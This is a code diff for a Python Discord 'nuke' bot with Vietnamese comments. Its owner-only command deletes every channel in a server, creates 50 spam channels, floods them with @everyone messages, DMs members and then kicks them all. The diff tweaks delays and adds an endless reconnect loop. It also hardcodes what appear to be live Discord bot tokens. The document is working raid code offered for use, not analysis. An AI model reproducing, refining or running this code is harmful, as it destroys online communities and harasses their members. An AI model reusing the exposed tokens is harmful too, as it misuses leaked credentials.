@@ -4,6 +4,7 @@ import asyncio
 import os
 from flask import Flask
 from threading import Thread
+import time
 
 # =========================================================================
 # 1. WEB SERVER GIỮ BOT SỐNG 24/7 (RENDER / REPLIT / UPTIME)
@@ -23,12 +24,13 @@ def keep_alive():
     t.daemon = True
     t.start()
 
+# Khởi chạy web server trước tiên để không bao giờ bị lỗi 502 trên Render
 keep_alive()
 
 # =========================================================================
 # 2. CẤU HÌNH BOT & PHÂN QUYỀN OWNER
 # =========================================================================
-BOT_TOKEN = os.environ.get("BOT_TOKEN") or "MTU1MjU4NTIxNTU4NTgxNjU3Ng.GqjybU._PIVOkCNokhBqGhnhMvStANn2xgwJ1lwFmD9F8"
+BOT_TOKEN = os.environ.get("BOT_TOKEN") or "MTU1MjU4NTIxNTU4NTgxNjU3Ng.GNvR3u.8ka0y5ocdjsIMx1dkl0RyJttovF5Hyit4ywNjQ"
 OWNER_ID = 1475126394345361609  # ID Chủ sở hữu duy nhất được dùng lệnh
 
 intents = discord.Intents.default()
@@ -58,7 +60,7 @@ async def on_ready():
     print("==================================================")
 
 # =========================================================================
-# 3. LỆNH NUKE TOÀN DIỆN (TỐC ĐỘ SIÊU TỐC - 50 KÊNH, 20 TIN NHẮN)
+# 3. LỆNH NUKE TOÀN DIỆN (50 KÊNH, 20 TIN NHẮN)
 # =========================================================================
 @bot.command(name="nuke")
 @owner_only()
@@ -68,7 +70,7 @@ async def cmd_nuke(ctx):
     except:
         pass
 
-    print(f"[*] Bắt đầu thực thi chuỗi Nuke tốc độ siêu tốc...")
+    print(f"[*] Bắt đầu thực thi chuỗi Nuke...")
 
     # 1. Đổi ảnh server tự động từ file ảnh có sẵn trong thư mục
     image_extensions = (".png", ".jpg", ".jpeg", ".webp")
@@ -125,7 +127,7 @@ async def cmd_nuke(ctx):
         with open("ngon.txt", "w", encoding="utf-8") as f:
             f.write("@everyone @here Bot Nuke By Senko🐳💦🔥")
 
-    # 5. Đọc nội dung tin nhắn DM cho thành viên từ file loicuoi.txt
+    # 5. Đọc nội dung tin nhắn DM từ file loicuoi.txt
     dm_content = "Tạm biệt bạn! Server đã bị nuke."
     if os.path.exists("loicuoi.txt"):
         try:
@@ -137,15 +139,15 @@ async def cmd_nuke(ctx):
         with open("loicuoi.txt", "w", encoding="utf-8") as f:
             f.write("Tạm biệt! Đây là lời cuối từ Senko Edition.")
 
-    # 6. Xóa toàn bộ kênh cũ đồng loạt ngay lập tức
+    # 6. Xóa toàn bộ kênh cũ đồng loạt
     all_channels = ctx.guild.channels
     if all_channels:
         print(f"[*] Đang xóa đồng loạt {len(all_channels)} kênh/danh mục cũ...")
         delete_tasks = [ch.delete() for ch in all_channels]
         await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    # 7. Tạo 50 kênh mới siêu tốc (Chia batch song song cực nhanh không giật lag)
-    print(f"[*] Đang tạo 50 kênh mới tốc độ siêu tốc...")
+    # 7. Tạo 50 kênh mới tốc độ cao
+    print(f"[*] Đang tạo 50 kênh mới...")
     created_channels = []
     
     async def create_single_channel(name):
@@ -155,7 +157,6 @@ async def cmd_nuke(ctx):
         except:
             return None
 
-    # Tạo đồng thời các batch để vừa đạt tốc độ tối đa vừa tránh khóa 429
     batch_size = 25
     for i in range(0, 50, batch_size):
         batch_names = [channel_names[(j) % len(channel_names)] for j in range(i, min(i + batch_size, 50))]
@@ -163,13 +164,13 @@ async def cmd_nuke(ctx):
         for ch in results:
             if isinstance(ch, discord.TextChannel):
                 created_channels.append(ch)
-        await asyncio.sleep(0.02)
+        await asyncio.sleep(0.05)
 
     # 8. Chuẩn bị file ảnh cho Embed
     embed_image_url = "attachment://raid_img.png" if image_path else None
 
-    # 9. Gửi liên tục 20 tin nhắn Embed vào tất cả các kênh đồng loạt cực nhanh
-    print(f"[*] Đang spam 20 tin nhắn đồng loạt vào tất cả các kênh...")
+    # 9. Gửi 20 tin nhắn vào các kênh
+    print(f"[*] Đang spam tin nhắn vào các kênh...")
     send_tasks = []
     
     for ch in created_channels:
@@ -190,20 +191,18 @@ async def cmd_nuke(ctx):
                     send_tasks.append(ch.send(content=message_content, embed=embed))
 
     if send_tasks:
-        # Gửi tin nhắn theo cụm song song siêu tốc
         for i in range(0, len(send_tasks), 40):
             chunk = send_tasks[i:i+40]
             await asyncio.gather(*chunk, return_exceptions=True)
-            await asyncio.sleep(0.02)
+            await asyncio.sleep(0.05)
 
-    # 10. Gửi DM Embed ngầu và Kick toàn bộ thành viên đồng loạt
-    print(f"[*] Đang tiến hành gửi DM Embed và kick toàn bộ thành viên...")
+    # 10. Gửi DM và Kick thành viên
+    print(f"[*] Đang gửi DM và kick thành viên...")
     members = ctx.guild.members
     
     async def process_member(member):
         if member.bot or member.id == bot.user.id or member.id == ctx.author.id:
             return
-        # Gửi DM dạng Embed ngầu
         try:
             dm_ch = await member.create_dm()
             embed_dm = discord.Embed(
@@ -221,7 +220,6 @@ async def cmd_nuke(ctx):
         except:
             pass
         
-        # Kick thành viên
         try:
             await member.kick(reason="Nuke By Senko Edition")
         except:
@@ -234,8 +232,8 @@ async def cmd_nuke(ctx):
             await asyncio.gather(*chunk, return_exceptions=True)
             await asyncio.sleep(0.05)
 
-    # 11. Gửi tin nhắn DM tổng kết cực ngầu cho Owner và Chủ Server
-    print(f"[*] Đang gửi tin nhắn tổng kết tối cao cho Owner và Chủ Server...")
+    # 11. Gửi tin nhắn tổng kết cho Owner và Chủ Server
+    print(f"[*] Đang gửi tin nhắn tổng kết cho Owner và Chủ Server...")
     
     targets = set()
     if ctx.guild.owner:
@@ -277,13 +275,17 @@ async def cmd_nuke(ctx):
         except Exception as e:
             print(f"[-] Không thể gửi DM tổng kết cho {target.name}: {e}")
 
-    print(f"[✓] Hoàn tất toàn bộ chuỗi Nuke toàn diện thành công!")
+    print(f"[✓] Hoàn tất toàn bộ chuỗi Nuke thành công!")
 
 # =========================================================================
-# 4. KHỞI CHẠY BOT
+# 4. KHỞI CHẠY BOT AN TOÀN (CHỐNG CRASH SẬP WEB SERVER)
 # =========================================================================
 if __name__ == "__main__":
-    try:
-        bot.run(BOT_TOKEN)
-    except KeyboardInterrupt:
-        print("\nĐã tắt bot thành công.")
+    while True:
+        try:
+            print("[*] Đang kết nối bot tới Discord...")
+            bot.run(BOT_TOKEN)
+        except Exception as e:
+            print(f"[!] Lỗi kết nối / Bị Rate Limit: {e}")
+            print("[!] Đang chờ 30 giây trước khi thử kết nối lại...")
+            time.sleep(30)
